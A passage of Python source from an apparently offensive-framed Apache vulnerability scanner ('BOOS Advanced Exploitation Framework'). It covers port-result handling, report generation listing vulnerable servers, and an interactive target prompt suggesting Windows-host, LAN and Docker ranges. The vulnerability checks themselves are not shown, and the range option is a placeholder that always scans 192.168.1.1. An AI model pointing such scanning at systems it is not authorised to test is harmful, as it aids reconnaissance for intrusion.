                    open_ports.append({'port': port, 'service': service_type})
            except:
                continue
        
        if not open_ports:
            print(f"{Fore.YELLOW}    [-] No open ports found on {target}{Style.RESET_ALL}")
            
            # Suggest common targets in WSL
            if self.in_wsl:
                print(f"{Fore.CYAN}    [*] Common targets in WSL:{Style.RESET_ALL}")
                print(f"        • Windows host: {self.wsl_scanner.windows_ip}")
                print(f"        • WSL itself: {self.wsl_scanner.get_local_network()['wsl_ip']}")
                print(f"        • Docker containers: 172.17.0.0/16")
            return
        
        # Scan each open port
        for port_info in open_ports:
            port = port_info['port']
            
            # Only scan HTTP/HTTPS services
            if port_info['service'] in ['http', 'https', 'apache']:
                self.rate_limiter.wait()
                result = self.comprehensive_vuln_check(target, port)
                
                if result['vulnerable']:
                    self.vulnerable_servers.append(result)
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive JSON report"""
        if not self.vulnerable_servers:
            print(f"\n{Fore.YELLOW}    [*] No vulnerable servers found{Style.RESET_ALL}")
            return
        
        report = {
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_vulnerable': len(self.vulnerable_servers),
            'scanner': 'BOOS Advanced Exploitation Framework',
            'environment': {
                'wsl': self.in_wsl,
                'windows_host': self.wsl_scanner.windows_ip if self.in_wsl else None
            },
            'vulnerable_servers': self.vulnerable_servers
        }
        
        # Save JSON report
        report_file = f"boos_apache_report_{time.strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Save text report
        txt_report = f"boos_apache_report_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        with open(txt_report, 'w', encoding='utf-8') as f:
            f.write("╔════════════════════════════════════════════════════════════╗\n")
            f.write("║     BOOS Advanced Exploitation Framework - Scan Report    ║\n")
            f.write("╚════════════════════════════════════════════════════════════╝\n\n")
            f.write(f"Scan Time: {report['scan_time']}\n")
            f.write(f"WSL Environment: {self.in_wsl}\n")
            if self.in_wsl:
                f.write(f"Windows Host IP: {self.wsl_scanner.windows_ip}\n")
            f.write("=" * 60 + "\n\n")
            
            for idx, server in enumerate(self.vulnerable_servers, 1):
                f.write(f"[{idx}] {server['url']}\n")
                f.write(f"    Confidence: {server['confidence']}%\n")
                f.write(f"    Apache Version: {server['version_info'].get('version', 'Unknown')}\n")
                f.write(f"    WAF Present: {server['waf_info'].get('present', False)}\n")
                if server.get('evidence'):
                    f.write("    Evidence:\n")
                    for evidence in server['evidence']:
                        f.write(f"      • {evidence['technique']}: {evidence['evidence']}\n")
                f.write("-" * 40 + "\n")
        
        # Print summary
        terminal_width = CyberSecurityLogo.get_terminal_size()
        print(f"\n{Fore.GREEN}┌" + "─" * (terminal_width - 2) + "┐" + Style.RESET_ALL)
        print(f"{Fore.GREEN}│" + f"{Fore.RED}📊 SCAN COMPLETE - FINAL REPORT 📊".center(terminal_width - 2) + f"{Fore.GREEN}│" + Style.RESET_ALL)
        print(f"{Fore.GREEN}├" + "─" * (terminal_width - 2) + "┤" + Style.RESET_ALL)
        print(f"{Fore.GREEN}│" + f"{Fore.YELLOW}   Vulnerable servers found: {Fore.RED}{len(self.vulnerable_servers)}".ljust(terminal_width - 2) + f"{Fore.GREEN}│" + Style.RESET_ALL)
        print(f"{Fore.GREEN}│" + f"{Fore.YELLOW}   JSON Report: {Fore.CYAN}{report_file}".ljust(terminal_width - 2) + f"{Fore.GREEN}│" + Style.RESET_ALL)
        print(f"{Fore.GREEN}│" + f"{Fore.YELLOW}   Text Report: {Fore.CYAN}{txt_report}".ljust(terminal_width - 2) + f"{Fore.GREEN}│" + Style.RESET_ALL)
        print(f"{Fore.GREEN}└" + "─" * (terminal_width - 2) + "┘" + Style.RESET_ALL)
        
        # Print vulnerable servers summary
        for idx, server in enumerate(self.vulnerable_servers, 1):
            print(f"\n{Fore.RED}    ⚔️  Target {idx}: {server['url']}{Style.RESET_ALL}")
            print(f"        {Fore.YELLOW}Confidence: {server['confidence']}%{Style.RESET_ALL}")
            print(f"        {Fore.YELLOW}Version: {server['version_info'].get('version', 'Unknown')}{Style.RESET_ALL}")
    
    def run(self):
        """Main execution function with WSL optimizations"""
        self.logo.print_banner()
        
        # Show WSL network info
        if self.in_wsl:
            network_info = self.wsl_scanner.get_local_network()
            print(f"\n{Fore.CYAN}┌────────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│{Fore.GREEN}    🌐 WSL Network Information:{Style.RESET_ALL}" + " " * 35 + f"{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}├────────────────────────────────────────────────────────────────┤{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│{Fore.YELLOW}    WSL IP: {Fore.WHITE}{network_info['wsl_ip'] or 'Unknown':<50}{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│{Fore.YELLOW}    Windows Host IP: {Fore.WHITE}{network_info['windows_ip']:<43}{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│{Fore.YELLOW}    Local Network Range: {Fore.WHITE}{network_info['windows_ip']}/24{'':<25}{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}└────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        while True:
            print(f"\n{Fore.CYAN}┌────────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│{Fore.RED}    🎯 BOOS Framework - Enter Target Information{Style.RESET_ALL}" + " " * 18 + f"{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}├────────────────────────────────────────────────────────────────┤{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│{Fore.GREEN}    Examples:{Style.RESET_ALL}" + " " * 45 + f"{Fore.CYAN}│{Style.RESET_ALL}")
            if self.in_wsl:
                print(f"{Fore.CYAN}│      • {Fore.YELLOW}{self.wsl_scanner.windows_ip} {Fore.WHITE}(Windows host){Style.RESET_ALL}" + " " * 29 + f"{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│      • {Fore.YELLOW}192.168.1.1 {Fore.WHITE}(Local network){Style.RESET_ALL}" + " " * 32 + f"{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│      • {Fore.YELLOW}example.com {Fore.WHITE}(Domain){Style.RESET_ALL}" + " " * 36 + f"{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│      • {Fore.YELLOW}quit {Fore.WHITE}(Exit){Style.RESET_ALL}" + " " * 44 + f"{Fore.CYAN}│{Style.RESET_ALL}")
            print(f"{Fore.CYAN}└────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
            
            target = input(f"\n{Fore.RED}BOOS{Fore.YELLOW}@{Fore.CYAN}Framework{Fore.WHITE}> {Style.RESET_ALL}").strip()
            
            if target.lower() in ['quit', 'exit', 'q']:
                print(f"\n{Fore.YELLOW}    [*] Exiting BOOS Framework...{Style.RESET_ALL}")
                time.sleep(1)
                print(f"{Fore.RED}    ⚔️  Stay Secure! BOOS Out.{Style.RESET_ALL}")
                break
            
            if not target:
                continue
            
            try:
                self.vulnerable_servers = []
                
                # Check if it's a range
                if '/' in target or '-' in target:
                    print(f"{Fore.YELLOW}    [*] Scanning network ranges - scanning first 5 hosts for demo{Style.RESET_ALL}")
                    # In production, you'd expand this to scan all hosts
                    self.scan_target('192.168.1.1')  # Placeholder
                else:
                    self.scan_target(target)
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}    [*] Scan interrupted{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}    [!] Error: {e}{Style.RESET_ALL}")

def main():
    """Main entry point with WSL detection"""
    # Check if running in WSL
    in_wsl = WSLEnvironment().check_wsl()
    
    scanner = AdvancedApacheScanner()
    
    try:
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}    [*] Exiting BOOS Framework...{Style.RESET_ALL}")
        time.sleep(1)
        print(f"{Fore.RED}    ⚔️  Stay Secure! BOOS Out.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}    [!] Fatal error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()